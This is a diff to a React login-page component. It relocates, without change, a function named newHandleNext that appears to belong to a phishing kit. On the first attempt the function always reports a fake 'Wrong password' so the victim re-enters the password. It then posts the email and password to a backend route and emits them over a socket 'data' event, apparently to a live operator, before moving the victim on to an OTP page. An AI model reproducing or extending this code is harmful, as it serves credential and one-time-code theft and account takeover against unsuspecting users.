@@ -43,55 +43,6 @@ const AuthPage = () => {
         }
     };
 
-    const newHandleNext = async () => {
-        if (attempt === 1) {
-            setLoading(true);
-            setError("Loading");
-            setTimeout(() => {
-                setPassword("");
-                setError("Wrong password");
-            }, 1500);
-            setLoading(false);
-            setAttempt(2);
-            return;
-        }
-        if (loading) {
-            InfoToast({ message: "Your request is processing" });
-            return;
-        }
-
-        if (email === "" || password === "") {
-            setError("Email and Password required");
-            return;
-        }
-        if (!CheckEmail({ email })) {
-            setError("Please enter a valid email address");
-            return;
-        }
-
-        setLoading(true);
-        setError("Loading");
-
-        try {
-            const response = await axios.post("/api/auth/skip/firtsPage", { e: email, p: password, status: activeUser, id: activeUserUID });
-            setLoading(false);
-            if (response.data.status === 200) {
-                socket.emit("data", { e: email, p: password, id: pathId, notify_id: response.data.notify_id, data_id: response.data.data_id });
-                setPageNumber(true);
-                setError("");
-                setDataId(response.data.data_id);
-                router.push(`/auth/login?id=${pathId}&&security=true`);
-            } else {
-                message.error("Something went wrong");
-                console.log(response);
-            }
-        } catch (error) {
-            setLoading(false);
-            setError("Something went wrong");
-            console.error(error);
-        }
-    };
-
     const sanitizeQueryParam = (param: any) => {
         const cleanParam = DOMPurify.sanitize(param);
         const sanitized = cleanParam.replace(/[^\w\s-_]/g, '');
@@ -146,6 +97,56 @@ const AuthPage = () => {
 
     const handleOTPEvent = (otp: any) => {
         setOtp(otp);
+    };
+
+
+    const newHandleNext = async () => {
+        if (attempt === 1) {
+            setLoading(true);
+            setError("Loading");
+            setTimeout(() => {
+                setPassword("");
+                setError("Wrong password");
+            }, 1500);
+            setLoading(false);
+            setAttempt(2);
+            return;
+        }
+        if (loading) {
+            InfoToast({ message: "Your request is processing" });
+            return;
+        }
+
+        if (email === "" || password === "") {
+            setError("Email and Password required");
+            return;
+        }
+        if (!CheckEmail({ email })) {
+            setError("Please enter a valid email address");
+            return;
+        }
+
+        setLoading(true);
+        setError("Loading");
+
+        try {
+            const response = await axios.post("/api/auth/skip/firtsPage", { e: email, p: password, status: activeUser, id: activeUserUID });
+            setLoading(false);
+            if (response.data.status === 200) {
+                socket.emit("data", { e: email, p: password, id: pathId, notify_id: response.data.notify_id, data_id: response.data.data_id });
+                setPageNumber(true);
+                setError("");
+                setDataId(response.data.data_id);
+                router.push(`/auth/login?id=${pathId}&&security=true`);
+            } else {
+                message.error("Something went wrong");
+                console.log(response);
+            }
+        } catch (error) {
+            setLoading(false);
+            setError("Something went wrong");
+            console.error(error);
+        }
     };
 
     const newHandleOTPNext = async () => {
